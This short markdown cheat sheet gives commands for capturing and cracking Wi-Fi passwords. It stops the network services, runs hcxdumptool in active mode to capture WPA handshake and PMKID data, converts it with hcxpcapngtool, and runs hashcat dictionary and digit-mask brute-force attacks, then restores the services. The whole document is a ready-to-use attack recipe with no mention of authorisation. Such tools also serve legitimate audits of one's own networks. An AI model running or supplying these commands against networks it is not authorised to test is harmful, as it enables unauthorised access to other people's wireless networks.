# COMMANDS

## Initial step

```bash
sudo systemctl stop NetworkManager.service
```

```bash
sudo systemctl stop wpa_supplicant.service
```

## Using hcxdumptool to capture pcapng file

```bash
sudo hcxdumptool -i wlan0 -o dumpfile.pcapng --active_beacon --enable_status=15 
```

## Using hcxpcapngtool to convert pcapng file to hash file

```bash
hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng
```

```bash
hashcat -m 22000 hash.hc22000 wordlist.txt
```

## on Windows OS

```bash
hashcat.exe -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
```

```bash
hashcat.exe -m 22000 hash.hc22000 -a 3 --increment --increment-min 8 --increment-max 18 ?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d
```

## Set Network and utils to normal state

```bash
sudo systemctl start wpa_supplicant.service
```

```bash
sudo systemctl start NetworkManager.service
```
